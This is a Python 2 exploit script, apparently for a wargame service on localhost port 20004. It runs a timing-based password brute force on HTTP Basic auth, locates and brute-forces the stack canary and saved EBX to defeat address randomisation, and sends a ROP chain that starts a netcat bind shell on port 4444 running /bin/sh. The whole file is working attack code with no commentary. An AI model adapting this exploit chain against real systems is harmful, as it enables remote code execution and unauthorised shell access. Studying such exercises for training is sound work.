#!/usr/bin/python

from socket import *  
from struct import *  
import base64  
import time  
import string

def try_password(password):  
    credentials = base64.b64encode("stack6:{0}".format(password))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("localhost", 20004))
    request = "GET / HTTP/1.0\r\n"
    request += "Authorization: Basic {0}\r\n".format(credentials)
    request += "\n"
    begin = time.time()
    s.send(request)
    response = s.recv(1024)
    end = time.time()
    s.close()
    return (end-begin, response)

def bruteforce():  
    password = ""
    count = 3
    i = 0
    while i<16:
        candidate = ""
        others = 10000000
        response = ""
        for char in string.ascii_letters+string.digits:
            (time, response) = try_password(password + char)
            #print("trying {0}, reponse in {1}".format(char, time))
            if "Unauthorized" not in response:
                print("[+] Eureka " + password + char)
                return password + char
            else:
                if time < others:
                    candidate = char
                    others = time
        password += candidate
        #print(password)
        i += 1

print("[+] Bruteforcing password ...")  
passwd = bruteforce()

print("[+] Validating password ...")  
credentials = base64.b64encode("stack6:{0}".format(passwd))  
s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20004))  
request = "GET / HTTP/1.0\r\n"  
request += "Authorization: Basic {0}\r\n".format(credentials)  
request += "\n"  
s.send(request)  
response = s.recv(1024)  
print("[+] Server response " + response.replace("\n",""))  
s.close()

canary_offset = 2000  
print("[+] Searching Canary offset. Starting with {0} ...".format(canary_offset))  
while True:  
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("localhost", 20004))
    credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset))
    request = "GET / HTTP/1.0\r\n"
    request += "Authorization: Basic {0}\r\n".format(credentials)
    request += "\n"
    s.send(request)
    response = s.recv(1024)
    s.close()
    if "smashing" in response:
        print("[+] Server response " + response.replace("\n", ""))
        print("[+] Canary offset: " + str(canary_offset))
        canary_offset -= 1
        break
    canary_offset += 1

print("[+] Bruteforcing Canary ...")  
canary = ""  
for byte in xrange(4):  
    for canary_byte in xrange(256):
        hex_byte = chr(canary_byte)
        #print("[+] Trying: {0}{1}".format(canary.encode("hex"), hex_byte.encode("hex")))
        credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + hex_byte))
        s = socket(AF_INET, SOCK_STREAM)
        s.connect(("localhost", 20004))
        request = "GET / HTTP/1.0\r\n"
        request += "Authorization: Basic {0}\r\n".format(credentials)
        request += "\n"
        s.send(request)
        response = s.recv(1024)
        s.close()
        if "smashing" not in response:
            canary += hex_byte
            print("[+] Found canary byte: " + hex(canary_byte))
            break
print("[+] Canary found: " + canary.encode("hex"))

print("[+] Bruteforcing EBX ...")  
ebx = ""  
for byte in xrange(4):  
    for ebx_byte in xrange(256):
        hex_byte = chr(ebx_byte)
        #print("[+] Trying: {0}{1}".format(ebx.encode("hex"), hex_byte.encode("hex")))
        credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + hex_byte))
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.connect(("localhost", 20004))
            request = "GET / HTTP/1.0\r\n"
            request += "Authorization: Basic {0}\r\n".format(credentials)
            request += "\n"
            s.send(request)
            response = s.recv(1024)
            s.close()
            if "200" in response:
                ebx += hex_byte
                print("[+] Found EBX byte: " + hex(ebx_byte))
                break
        except:
            pass
print("[+] EBX found: " + ebx.encode("hex"))  
base = unpack("<I", ebx)[0] - 0x4118  
print("[+] Binary loaded at address: {0}".format(hex(base)))


print("[+] Bruteforcing libc base address")  
for off in range(0xb7000000, 0xb8000000, 0x1000):  
        p = ''
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c0) # @ .data
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /usr
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c4) # @ .data + 4
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/bin" # /bin
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789c8) # @ .data + 8
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "////" # /net
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cc) # @ .data + 12
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "/ncA" # catA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789cf) # @ .data + 15
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-lnp" # -lnp
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d4) # @ .data + 20
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "4444" # 4444
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d8) # @ .data + 24
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "-e/b" # -e/b
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789dd) # @ .data + 29
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "in/s" # in/s
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e1) # @ .data + 33
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += "hAAA" # hAAA
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e2) # @ .data + 34
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e7) # @ .data + 39
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d0) # @ .data + 16
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789eb) # @ .data + 43
        p += "AAAA" # padding
        p += pack("<I", off + 0x000238df) # pop eax ; ret
        p += pack("<I", off + 0x001789d9) # @ .data + 25
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        p += "AAAA" # padding
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
        p += pack("<I", off + 0x00018f4e) # pop ebx ; ret
        p += pack("<I", off + 0x001789c0) # @ .data
        p += pack("<I", off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
        p += "AAAA" # padding
        p += pack("<I", off + 0x001789e3) # @ .data + 35
        p += "AAAA" # padding
        p += pack("<I", off + 0x00001a9e) # pop edx ; ret
        p += pack("<I", off + 0x001789ef) # @ .data + 47
        p += pack("<I", off + 0x000328e0) # xor eax,eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x00026722) # inc eax ; ret
        p += pack("<I", off + 0x0002dd35) # int 0x80
    credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + "E"*12 + p))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("localhost", 20004))
    request = "GET / HTTP/1.0\r\n"
    request += "Authorization: Basic {0}\r\n".format(credentials)
    request += "\n"
    s.send(request)
    s.close()

raw_input("[+] Attach GDB to server process and Press Enter to continue...")  
credentials = base64.b64encode("stack6:{0}".format(passwd + "A"*canary_offset + canary + "B"*12 + ebx + "E"*12 + "DDDD"))  
s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20004))  
request = "GET / HTTP/1.0\r\n"  
request += "Authorization: Basic {0}\r\n".format(credentials)  
request += "\n"  
s.send(request)  
response = s.recv(1024)  
s.close()  